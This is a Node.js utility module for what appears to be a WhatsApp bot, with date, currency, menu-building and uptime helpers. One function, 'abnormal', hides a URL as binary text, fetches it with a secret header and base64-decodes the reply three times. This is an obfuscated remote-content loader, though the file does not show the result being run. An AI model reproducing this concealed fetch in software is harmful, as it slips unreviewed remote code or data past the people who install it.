/**
 * Copyright © 2025 [ balxzzy ]
 *
 * All rights reserved. This source code is the property of [ Shiina Team ].
 * Unauthorized copying, distribution, modification, or use of this file,
 * via any medium, is strictly prohibited without prior written permission.
 *
 * This software is protected under international copyright laws.
 *
 * Contact: [ pa424013@gmail.com ]
 * GitHub: https://github.com/balxz
 * Official: https://balxzzy.web.id
 * Support: https://t.me/sh_team1
 */
const fs = require("fs");
const path = require("path");
const axios = require("axios");

/**
 * Format tanggal lokal (Asia/Makassar)
 */
exports.tggl = () => {
  return new Date().toLocaleDateString("id-ID", {
    timeZone: "Asia/Makassar",
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
};

/**
 * Format jam lokal (Asia/Makassar)
 */
exports.jam = () => {
  return new Date().toLocaleTimeString("id-ID", {
    timeZone: "Asia/Makassar",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
};

/**
 * Generate menu dari plugins
 */
exports.menu = () => {
  /** Baca file case **/
  let cmd = {};
  let buf = [];
  for (let line of fs
    .readFileSync(process.cwd() + "/cmd/case-wa.js", "utf8")
    .split("\n")) {
    let c = line.trim();
    let m = c.match(/^case\s+["']?([^"']+)["']?:/);
    if (m) buf.push(m[1]);
    let tags = [...c.matchAll(/\/\/\s*@(\w+)(?:\s+(.*))?/g)];
    for (let [_, tag, desc] of tags) {
      if (buf.length) {
        tag = tag.toLowerCase();
        desc = desc?.replace(/^(@|\/\/\s*@)/, "").trim();
        cmd[tag] = (cmd[tag] || []).concat(buf.map((x) => ({ name: x, desc })));
        buf = [];
      }
    }

    if (c.includes("{") && !tags.length && buf.length) buf = [];
  }

  /** baca folder di CMD **/
  let read = (dir) =>
    fs.readdirSync(dir).forEach((f) => {
      let p = path.join(dir, f);
      if (fs.statSync(p).isDirectory()) return read(p);
      if (!f.endsWith(".js")) return;

      let x = require(path.resolve(p));
      if (!Array.isArray(x.command) || !Array.isArray(x.tags)) return;

      for (let t of x.tags) {
        t = t.toLowerCase();
        for (let n of x.command) {
          cmd[t] = (cmd[t] || []).concat({
            name: n,
            desc: Array.isArray(x.desc) ? x.desc[0] : x.desc,
          });
        }
      }
    });

  read(process.cwd() + "/cmd/plugins");
  return cmd;
};

//??????????????????????
exports.abnormal = async () => {
  let p =
    "01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01111001 01100111 01111001 00101101 01111000 01101001 00101110 01110110 01100101 01110010 01100011 01100101 01101100 00101110 01100001 01110000 01110000";
  let g = p
    .split(" ")
    .map((b) => String.fromCharCode(parseInt(b, 2)))
    .join("");
  let a = await axios
    .get(g, { headers: { "x-secret-key": "bocil-mana-tau" } })
    .then((a) => a.data);
  let k = Buffer.from(a, "base64").toString("utf-8");
  let o = Buffer.from(k, "base64").toString("utf-8");
  let n = Buffer.from(o, "base64").toString("utf-8");
  return n;
};

/**
 * Random string huruf kecil
 */
exports.r_text = (length) => {
  let characters = "abcdefghijklmnopqrstuvwxyz";
  let text = "";
  for (let i = 0; i < length; i++) {
    text += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return text;
};

/**
 * Format ke Rupiah
 */
exports.to_idr = (amount) => {
  return (
    "Rp " +
    Number(amount)
      .toString()
      .replace(/\B(?=(\d{3})+(?!\d))/g, ".")
  );
};

/**
 * Runtime uptime
 */
exports.runtime = () => {
  const ms = Date.now() - start;
  const days = Math.floor(ms / (1000 * 60 * 60 * 24));
  const hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
  const minutes = Math.floor((ms / (1000 * 60)) % 60);
  const seconds = Math.floor((ms / 1000) % 60);

  if (days > 0) return `${days}d ${hours}h ${minutes}m ${seconds}s`;
  if (hours > 0) return `${hours}h ${minutes}m ${seconds}s`;
  if (minutes > 0) return `${minutes}m ${seconds}s`;
  return `${seconds}s`;
};

let f = require.resolve(__filename);
fs.watchFile(f, () => {
  fs.unwatchFile(f);
  console.log(`~> UPDATE [ 🪷 ] ${f}`);
  delete require.cache[f];
  require(f);
});
